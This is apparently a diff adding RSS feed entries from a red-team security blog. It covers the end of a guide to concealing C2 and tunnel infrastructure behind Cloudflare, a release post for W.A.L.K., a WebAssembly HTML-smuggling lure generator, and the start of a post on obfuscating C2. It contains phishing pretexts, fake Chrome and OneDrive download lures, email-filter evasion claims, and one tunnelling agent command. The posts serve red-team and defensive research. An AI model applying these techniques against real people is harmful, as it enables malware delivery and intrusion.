+&lt;p&gt;This will generate us a token that can be used by your Worker to access the ‘Zero Trust’ area where our tunnels are located. The token will only be visible at this point so please note down both the ‘CF-Access-Client-Id’ and ‘CF-Access-Client-Secret’ fields and populate them in your wrangler.toml file and redeploy that or manually add them into the variables area of your Worker.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image25.png&#34; title=&#34;image25&#34; alt=&#34;image25&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image25&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Now our Worker has the ability to use a token to enter Cloudflare’s zero trust tunnels, but we still need to add the checks for this token ID on the tunnels themselves.&lt;/p&gt;
+&lt;p&gt;To do this we create 3 apps pointing to our 3 tunnel URLs as follows. Click ‘Add an application’ and choose ‘Self-hosted’:&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image26.png&#34; title=&#34;image26&#34; alt=&#34;image26&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image26&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Choose a name and the tunnel the app is meant to be linked to. So, if your tunnel is sliver.mydomain.com add those details in the redacted areas below.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image27.png&#34; title=&#34;image27&#34; alt=&#34;image27&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image27&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Next up we choose what Policies will be used to allow or deny data into the tunnel via the application. Here we choose our Service-Auth access we set up previously so only requests that have those two header values of ‘CF-Access-Client-Id’ and ‘CF-Access-Client-Secret’ will be allowed access i.e. only data via our clever Worker which now adds those two headers automatically can enter. An easy mistake to make here is to not choose ‘Service Auth’ under the ‘Action’ dropdown so make sure that is chosen.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image1.png&#34; title=&#34;image1&#34; alt=&#34;image1&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image1&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;The Policy’s remaining settings can remain as they are when you are creating Policies for Ligolo or for a C2 so create two apps exactly as per above if only using a C2 and Ligolo. For access to files, it is useful to add a second bypass policy and I will explain why now.&lt;/p&gt;
+&lt;p&gt;If you create another app called ‘Files’ to allow access into your remote file server, we can restrict requests entering from only a specific IP, but we can also allow privileged users directly into the files tunnel who have a specific email address outside of that IP. This is for the occasions when a team may want to access their remote VM files but don’t want to keep adding multiple custom IPs to the Worker or don’t need command line access via wget, certutil etc.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image2.png&#34; title=&#34;image2&#34; alt=&#34;image2&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image2&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;To do this add another policy called ‘Email’ and add an ‘Include’ email selector at the bottom and enter a specific email address or if you are working in a team you may want to allow all email addresses that end in mycompany.com for example.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image3.png&#34; title=&#34;image3&#34; alt=&#34;image3&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image3&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;What happens then is, when you visit the files tunnel URL directly (&lt;a href=&#34;https://files.yourdomain.com&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://files.yourdomain.com&lt;/a&gt;) therefore bypassing the IP checks of the Worker redirector you can still access it and you will be presented with this webpage as shown:&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image5.png&#34; title=&#34;image5&#34; alt=&#34;image5&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image5&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;You can then enter your email address of &lt;a href=&#34;mailto:john.doe@mycompany.com&#34; &gt;john.doe@mycompany.com&lt;/a&gt; and if the email is valid as per the Policy, you will be emailed a code to get access through the tunnel.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image6.png&#34; title=&#34;image6&#34; alt=&#34;image6&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image6&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;You can then access your files like this via the browser for example which is quite useful.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image7.png&#34; title=&#34;image7&#34; alt=&#34;image7&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image7&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;At the end of this config process, you should now have a bunch of applications pointing to your tunnels as shown, kinda acting like gatekeepers to them via Policies, hence the zero-trust aspect:&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/image8.png&#34; title=&#34;image8&#34; alt=&#34;image8&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;image8&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;So, if you are still with me that is now all we need to access our cloud infrastructure via Cloudflare. Just to summarise, this is now how it all becomes operational:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;We update Cloudflare as I have shown to expect our custom header values.&lt;/li&gt;
+&lt;li&gt;We update Cloudflare to expect a custom IP should we want to grab files from a specific IP.&lt;/li&gt;
+&lt;li&gt;We can generate a C2\Ligolo agent with a custom header. Therefore, with the branched websockets version of Ligolo-ng as an example you can do the following:&lt;code&gt;ligolosockets.exe -connect https://redirector.myname.workers.dev:443 -ua MY-LIGOLO&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;We send all of our requests to the Worker redirector URL and not to the tunnels directly as the Worker will add the zero trust header values required to enter the tunnels. Accessing them directly will no longer work except for the email login to our file server.&lt;/li&gt;
+&lt;li&gt;The worker passes the request to the app sitting in front of the tunnels which then checks for the service auth token to make sure it matches.&lt;/li&gt;
+&lt;li&gt;If the service auth token matches, the request is directed to that specific tunnel. This then flows into the internal URL of our Cloud VM (which is specified in the tunnel config) to provide us with our connectivity.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;The above Cloudflare configuration coupled with Azure snapshots and Tmux Resurrect make for a really nice combination in regards swiftly bringing up your red team infrastructure. We hope that you found this useful, and we feel that it is worth trying this setup out for yourself and your team if you want to speed up your infrastructure creation.&lt;/p&gt;
+
+      </description>
+    </item>
+    
+    <item>
+      <title>WASM Smuggling for Initial Access and W.A.L.K. Tool Release</title>
+      <link>//localhost:1313/articles/2024/05/2024-05-31-wasm-smuggling-for-initial-access-and-w-a-l-k-tool-release/</link>
+      <pubDate>Fri, 31 May 2024 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/articles/2024/05/2024-05-31-wasm-smuggling-for-initial-access-and-w-a-l-k-tool-release/</guid>
+      <description>
+        
+        
+        &lt;p&gt;&lt;strong&gt;&lt;em&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/8salmg-ezgif.com-crop.gif&#34; title=&#34;8salmg ezgif.com crop&#34; alt=&#34;8salmg ezgif.com crop&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;8salmg ezgif.com crop&lt;/figcaption&gt;
+  &lt;/figure&gt;TL;DR&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;This blog post introduces Web Assembly (WASM) as a powerful alternative to traditional web technologies, highlighting its appeal to cybersecurity professionals for evading security measures for initial access. WASM has been observed being leveraged in the wild as a new payload delivery avenue which can land payloads in a hardened email inbox or instant messaging chats. A new tool, W.A.L.K. (Web Assembly Lure Krafter), is released alongside this blogpost to automate the generation of payloads using Rust, bringing back HTML smuggling attacks and enhancing red teamers tradecraft.&lt;/p&gt;
+&lt;h1&gt;Introduction&lt;/h1&gt;&lt;p&gt;Everyone is aware that the internet is powered by a plethora of platforms, services and technologies, but all the web content we see nowadays were fundamentally built using HTML, CSS and JavaScript. This has been the holy trinity of the web that allowed creative developers to build an amount of sites and content on the internet that cannot possibly be explored in the span of a lifetime, at least not in a non-automated fashion (and I guess I’m including the dark web too there).&lt;/p&gt;
+&lt;p&gt;At the same time not everyone is aware that a different way of building web pages has been available to developers and browsers for almost a decade, and this is called Web Assembly.&lt;/p&gt;
+&lt;p&gt;Web Assembly (also known as WASM) was released to the public for the first time in 2017. It has allowed internet wizards and obscure developers alike to simulate operating systems or play Doom (&lt;a href=&#34;https://wasm.continuation-labs.com/d3demo/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Doom 3 Demo&lt;/a&gt;) from within browsers (yes, it can play Doom!), opening the world wide web to a new way of building content that was once only reserved for compiled programming languages.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/WASM_Win2000.png&#34; title=&#34;WASM Win2000&#34; alt=&#34;WASM Win2000&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;WASM Win2000&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Windows 2000 rendered in browser using Web Assembly (&lt;a href=&#34;https://bellard.org/jslinux/vm.html?url=https://bellard.org/jslinux/win2k.cfg&amp;amp;mem=192&amp;amp;graphic=1&amp;amp;w=1024&amp;amp;h=768&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;view&lt;/a&gt;). More projects can be found on &lt;a href=&#34;https://madewithwebassembly.com/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;madewithwebassembly&lt;/a&gt;.&lt;/p&gt;
+&lt;h1&gt;What is WASM?&lt;/h1&gt;&lt;p&gt;WASM’s origins can be traced back to asm.js, a subset of JavaScript designed to facilitate the deployment of C and other demanding applications within web browsers. Recognising its potential, it was W3C that spearheaded it&amp;rsquo;s evolution into the open standard now known as Web Assembly. Web Assembly’s strengths lay in its core promise of speed and performance, far outpacing traditional JavaScript. It allows browsers to perform intensive computations with efficiency and stability, avoiding many of the pitfalls of JavaScript&amp;rsquo;s limitations.&lt;/p&gt;
+&lt;p&gt;It operates in two primary formats: a compact binary format for the browser&amp;rsquo;s Virtual Machine (VM) and an assembly-like textual format. While earlier technologies like Adobe’s Flash struggled with this, Web Assembly stands out, although it still remains under scrutiny for &lt;a href=&#34;https://www.youtube.com/watch?v=QWsSNRQN7v8&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;potential vulnerabilities&lt;/a&gt;. Importantly though, Web Assembly supports the seamless execution of code from multiple languages such as C, C++, Rust, and Go.&lt;/p&gt;
+&lt;h1&gt;Why is WASM interesting to cybersecurity folks?&lt;/h1&gt;&lt;p&gt;You probably guessed it by now! As it is a lesser known alternative to build web content, it is also more interesting for threat actors that want to circumvent classic email filters and their security controls.&lt;/p&gt;
+&lt;p&gt;From the red teaming perspective WASM presents features that can introduce malicious capabilities such as:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Run malicious content within browsers.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Evade traditional known-malicious JavaScript functions, like window.local.href (a property in JavaScript that gets or sets the URL of the current window, usually used to redirect the browser to a different URL) and window.navigator.msSaveOrOpenElob (typically used to download files from a web application, it allows for the saving or opening of a blob).&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Bypass detection mechanisms typical of conventional file type signatures.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Consider all of the mechanisms that browsers, web service providers, operating systems and security companies have developed and implemented over the years to identify, detect and alert against suspicious web pages that try to execute malicious code. Such defences have been mostly adapted to the malicious JavaScript and HTML tags that can be contained in a web page. So, what happens when instead we use Web Assembly to build a web page? We observe security controls becoming nearly non-existent when attempting to determine whether the web page is nefarious or legitimate.&lt;/p&gt;
+&lt;p&gt;Combine WASM with techniques such as payload smuggling and you get a modern and stealthy initial access tactic that gets past modern email and instant messaging defences allowing your initial access to land in your target’s inbox unhindered!&lt;/p&gt;
+&lt;p&gt;When I read about this I was way too excited not to dive into this evolved way of smuggling payloads and therefore, if you haven’t before, I’m honoured to introduce you to WASM smuggling and the tool I have built to automate payload generation.&lt;/p&gt;
+&lt;h1&gt;Smuggling Payloads using W.A.L.K.&lt;/h1&gt;&lt;p&gt;I was never a proficient developer (even more so for languages such as C or Rust) so I asked for some help from my favourite AI companion to better understand the concepts behind WASM smuggling. I started from this amazing article from &lt;a href=&#34;https://blog.delivr.to/webassembly-smuggling-it-wasmt-me-648a62547ff4&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;deliver.to&lt;/a&gt; and managed to create a few web lures leveraging Rust, which inevitably led me to wanting to build a tool to automate the process. The above deliver.to’s article describes how attackers have been using Rust to recreate classic HTML smuggling techniques that get past the craziest email controls. Bonus - it also gives some nice templates coded in Rust!&lt;/p&gt;
+&lt;p&gt;On top of this, a &lt;a href=&#34;https://www.crowdstrike.com/blog/ecriminals-increasingly-use-webassembly-to-hide-malware/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CrowdStrike article&lt;/a&gt; also described how threat actors have been using this technique for a few years now (the article is from 2021) and together with NetSPI’s blog post on &lt;a href=&#34;https://www.netspi.com/blog/technical-blog/adversary-simulation/obfuscating-html-smuggling-with-web-assembly/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;SilkWASM&lt;/a&gt; I felt like I had enough examples to start building towards executing this tactic and going through the process needed to generate lures to be weaponised for initial access.&lt;/p&gt;
+&lt;p&gt;At this point, we know that this technique is actively being used by malicious actors, it can circumvent traditional mail security controls and can be combined with obsolete and disused HTML smuggling techniques to perform older attacks in a modern fashion. Although bringing back Beef hooks may sound exciting, these were not very effective against modern browser sandboxing features. Yet attacks such as &lt;a href=&#34;https://blog.delivr.to/html-smuggling-recent-observations-of-threat-actor-techniques-74501d5c8a06&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;SVG Smuggling&lt;/a&gt; could be fruitful when built using WASM.&lt;/p&gt;
+&lt;p&gt;The process of creating a standalone WASM smuggling lure is somewhat tortuous if you are not a proficient Rust developer and I will purposefully skip the part where I tell you how to manually set one up. There is enough information on the internet to understand and guide you through this process. Nonetheless, allow me to introduce you to my new tool W.A.L.K. (Web Assembly Lure Krafter) which I developed to ease the above-mentioned process of building a standalone WASM payload smuggling lure.&lt;/p&gt;
+&lt;p&gt;The lure generated by the tool is based on prebuilt lure templates coded in Rust. It embeds payloads to smuggle through in a single HTML file which can then be sent in either instant messaging chats or via email attachments.&lt;/p&gt;
+&lt;p&gt;W.A.L.K. can be found at the following Github repository:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/JumpsecLabs/WALK_WebAssembly_Lure_Krafter&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/JumpsecLabs/WALK_WebAssembly_Lure_Krafter&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;Follow through the repo’s README to set up your Rust environment and the relevant WASM libraries. Once done, navigate to the project’s root folder and simply run the tool from the command line using cargo run.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/WALK_menu.png&#34; title=&#34;WALK menu&#34; alt=&#34;WALK menu&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;WALK menu&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;This will start W.A.L.K., presenting a menu with 3 lure templates to select from. The selection will be used to generate a template that embeds a custom payload and delivers it differently based on the lure selected.&lt;/p&gt;
+&lt;p&gt;The “Google Chrome Update” lure was designed to simulate a Google Chrome binary download motivated by a pretext such as “I.T. wants you to upgrade your version of Chrome”. The download button will trigger the download of the payload you embedded during the generation through W.A.L.K.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/NoPlaceLikeChrome.png&#34; title=&#34;NoPlaceLikeChrome&#34; alt=&#34;NoPlaceLikeChrome&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;NoPlaceLikeChrome&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;The “One Drive File Download” template instead uses a lure based on the looks of Microsoft OneDrive. The lure generated off this template will trigger a file download 4 seconds after rendering the web page, simulating the delivery of files via a shareable OneDrive link.&lt;/p&gt;
+&lt;p&gt;As an example, this can be used with the pretext of wanting to provide HR (or a recruiter) with your resume and perhaps smuggle a payload through with it.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/WelcomeToOneDrive.png&#34; title=&#34;WelcomeToOneDrive&#34; alt=&#34;WelcomeToOneDrive&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;WelcomeToOneDrive&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;After the lure is selected, the program will guide through all the other options and values needed to build the HTML smuggling payload in Web Assembly. For example, the program will ask for the file extension to utilise for the downloaded payload, its location on the file system for the payload to be embedded as well as the file name shown for the file when downloading the payload.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/WALK_output.png&#34; title=&#34;WALK output&#34; alt=&#34;WALK output&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;WALK output&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Once the lure is compiled, W.A.L.K. will show the relative file path of the generated lure. The file to smuggle consists of a standalone “index.html” file contained in the results folder of the project. Such index.html files can then be uploaded and sent via email or chat, effectively allowing your payload to be transported and smuggled through.&lt;/p&gt;
+&lt;p&gt;The above-mentioned lures, wrapped in a single HTML file, have been observed successfully landing in hardened corporate email inboxes, surprisingly circumventing any active controls that we are used to experiencing when dealing with email and instant messaging chats (e.g. spam filtering/classification, file AV scans), even when the message comes from standard non-corporate inboxes that present TLDs such as gmail.com, outlook.com, live.com, etc..&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/RevieMyFiles.png&#34; title=&#34;RevieMyFiles&#34; alt=&#34;RevieMyFiles&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;RevieMyFiles&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;The figure shows how the index.html file can be embedded into the email body to look more legitimate.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+    &lt;img src=&#34;images/OneDriveIsAGo.png&#34; title=&#34;OneDriveIsAGo&#34; alt=&#34;OneDriveIsAGo&#34; loading=&#34;lazy&#34; /&gt;
+    &lt;figcaption&gt;OneDriveIsAGo&lt;/figcaption&gt;
+  &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;For example, in this case both the email provider and OneDrive malware scans did not pick up the malicious contents of the file (called myFiles.html) and allowed the Download to happen from their platform.&lt;/p&gt;
+&lt;p&gt;The index.html file can then be sent in various ways and linked to your messages using a number of methods that may allow more or less number of clicks before the victim executes the contents of the smuggled payload. The reader is left with the arduous task of determining the best way to convey their smuggling lure to their victims and how many clicks their targets will need to go through before execution.&lt;/p&gt;
+&lt;p&gt;Although not properly documented as of now, W.A.L.K. was designed for modularity. This means that it is possible to create more lure templates to expand the menu selection and allow new templates to be utilised with the tool. Despite not being documented yet, these capabilities are there and anyone interested can dive into the code in the repository to leverage this feature. There will eventually be a follow up blog post explaining how to create new Web Assembly lures in Rust and how to make them so that they can be used to expand W.A.L.K.&amp;rsquo;s lurebase.&lt;/p&gt;
+&lt;h1&gt;Conclusions&lt;/h1&gt;&lt;p&gt;Although attacker-centric, this blogpost is intended to be a heads up for detection and response practitioners, but also to any defensive security researchers who feel the urge to dive into the intricacies of such a technique after reading this blog post.&lt;/p&gt;
+&lt;p&gt;Current security controls do not yet seem capable of determining the IoCs and the heuristics involved, and so we are in need of additional detection and prevention mechanisms that can reduce the risk of malicious web assembly attacks.&lt;/p&gt;
+&lt;p&gt;I really hope you enjoyed this article and will find my tool useful for your future red team engagements or to develop better defences and controls.&lt;/p&gt;
+&lt;p&gt;So long, and wish you the best of fun in your hacking journeys!&lt;/p&gt;
+&lt;h1&gt;Credit&lt;/h1&gt;&lt;p&gt;Credit where credit is due. This section is dedicated to give a big shout out to NetSPI for the initial research done into weaponising WASM for initial access as described in their article, linked here:&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.netspi.com/blog/technical-blog/adversary-simulation/obfuscating-html-smuggling-with-web-assembly/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;The Silk Wasm: Obfuscating HTML Smuggling with Web Assembly&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;And another thank you to the researchers at delivr.to who have released an amazing  research on how to build your WASM lure using Rust, which was used as a starting point for W.A.L.K. and really helped me understand this technique. You can find their research here:&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://blog.delivr.to/webassembly-smuggling-it-wasmt-me-648a62547ff4&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;WebAssembly Smuggling: It WASM’t me&lt;/a&gt;&lt;/p&gt;
+&lt;h1&gt;Resources:&lt;/h1&gt;&lt;ul&gt;
+&lt;li&gt;Link to W.A.L.K. (JUMPSEC Github):
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/JumpsecLabs/WALK_WebAssembly_Lure_Krafter&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Github - W.A.L.K. Web Assembly Lure Krafter&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;HTML Smuggling
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.outflank.nl/blog/2018/08/14/html-smuggling-explained/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.outflank.nl/blog/2018/08/14/html-smuggling-explained/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://assume-breach.medium.com/home-grown-red-team-lnk-phishing-in-2023-revisited-again-2b8c885b9836&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://assume-breach.medium.com/home-grown-red-team-lnk-phishing-in-2023-revisited-again-2b8c885b9836&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Web Assembly Smuggling Research
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.netspi.com/blog/technical/adversary-simulation/obfuscating-html-smuggling-with-web-assembly/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.netspi.com/blog/technical/adversary-simulation/obfuscating-html-smuggling-with-web-assembly/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://blog.delivr.to/webassembly-smuggling-it-wasmt-me-648a62547ff4&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://blog.delivr.to/webassembly-smuggling-it-wasmt-me-648a62547ff4&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Videos
+&lt;ul&gt;
+&lt;li&gt;Modern Initial Access and Evasion Tactics: &lt;a href=&#34;https://youtu.be/DyyD48iKsKE&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://youtu.be/DyyD48iKsKE&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Desperate Infection Chains:&lt;a href=&#34;https://youtu.be/CwNPP_Xfrts&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://youtu.be/CwNPP_Xfrts&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;CTI
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.crowdstrike.com/blog/ecriminals-increasingly-use-webassembly-to-hide-malware/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.crowdstrike.com/blog/ecriminals-increasingly-use-webassembly-to-hide-malware/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+
+      </description>
+    </item>
+    
+    <item>
+      <title>Obfuscating C2 During a Red Team Engagement</title>
+      <link>//localhost:1313/articles/2021/07/2021-07-16-obfuscating-c2-during-a-red-team-engagement/</link>
+      <pubDate>Fri, 16 Jul 2021 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/articles/2021/07/2021-07-16-obfuscating-c2-during-a-red-team-engagement/</guid>
+      <description>
+        
+        
+        &lt;h4&gt;&lt;strong&gt;By shd&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;by-shd&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#by-shd&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;figure&gt;
+&lt;p&gt;&lt;img src=&#34;images/5gxpvd-684x1024.jpeg&#34; alt=&#34;5gxpvd&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;figcaption&gt;
+&lt;p&gt;Red Team and Magicians&amp;hellip;&lt;/p&gt;
+&lt;/figcaption&gt;
+&lt;/figure&gt;
+&lt;h1&gt;&lt;strong&gt;1.What is Command and Control&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;Command-and-Control (C2) infrastructure is one the most important tools in a red teamer’s arsenal. In this article, we introduce a few simple methods that red teams use to harden their C2 infrastructure. &lt;/p&gt;
+&lt;p&gt;C2 comes in various forms - but regardless they all share a basic function: &lt;strong&gt;they allow the red teamer (or threat actor) to communicate with a compromised machine.&lt;/strong&gt; During an offensive campaign, testers may accumulate a number of compromised machines but it can be difficult and overwhelming to &lt;strong&gt;maintain, orchestrate, and control&lt;/strong&gt; them in large numbers. On top of this to guarantee the campaign’s longevity, malicious communications back and forth to the compromised machine must be &lt;strong&gt;secure, obfuscated, and reliable,&lt;/strong&gt; adding a further layer of complexity.&lt;/p&gt;
+&lt;h2&gt;1.1 C2 in the Wild&lt;span class=&#34;absolute -mt-20&#34; id=&#34;11-c2-in-the-wild&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#11-c2-in-the-wild&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Not all C2s are born equal.&lt;/strong&gt; Leveraging the right apparatus, with particular design, is paramount to the success of the engagement. Covert offensive engagement can &lt;strong&gt;last weeks if not months when simulating a realistic, stealthy attacker&lt;/strong&gt;. This places significant demands and &lt;strong&gt;pressures on the C2 infrastructure.&lt;/strong&gt; Ethical red teamers and real-world adversaries begrudgingly share many tools and tricks. Both are purveyors of the finest C2 frameworks to manage their malicious campaign from.&lt;/p&gt;
+&lt;p&gt;In the field, there are some choice C2 frameworks for red teamers. &lt;a href=&#34;https://docs.rapid7.com/metasploit/manage-meterpreter-and-shell-sessions/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;Metasploit&lt;/strong&gt;&lt;/a&gt; is incredibly popular for it’s &lt;strong&gt;intuitive&lt;/strong&gt; use and stripped-back command line approach (script-kiddie-friendly indeed!). However, &lt;strong&gt;Metasploit&lt;/strong&gt; loses major points for its &lt;strong&gt;fragility&lt;/strong&gt; and lack of &lt;strong&gt;maintainability&lt;/strong&gt; - the red team can’t trust &lt;strong&gt;unreliable&lt;/strong&gt; tools! There are other C2 frameworks like &lt;a href=&#34;https://www.powershellempire.com/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;PowerShell Empire&lt;/strong&gt;&lt;/a&gt; or it’s (GUI-version) &lt;a href=&#34;https://stealthbits.com/blog/next-gen-open-source-c2-frameworks/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;successor Covenant&lt;/strong&gt;&lt;/a&gt; that offer a red team the &lt;strong&gt;malleability&lt;/strong&gt; they desire from a C2 infrastructure. However, there is a particular C2 that meets most if not all the red team’s requirements, and are the &lt;a href=&#34;https://intel471.com/blog/cobalt-strike-cybercriminals-trickbot-qbot-hancitor&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;evidenced-favourite&lt;/strong&gt;&lt;/a&gt; of the adversary: &lt;strong&gt;Cobalt Strike.&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;At JUMPSEC&lt;/strong&gt;  we’ve come up against adversaries who have leveraged Cobalt Strike in incredibly sneaky ways. We’ve identified some interesting detections to hunt this C2 down, however it really is a &lt;strong&gt;cat and mouse game&lt;/strong&gt;. As defenders tune and improve their monitoring controls, adversaries will shift their behaviour over time to evade detection - meaning that that defenders must identify new behaviours and techniques to monitor for. &lt;/p&gt;&lt;/blockquote&gt;
+&lt;blockquote&gt;
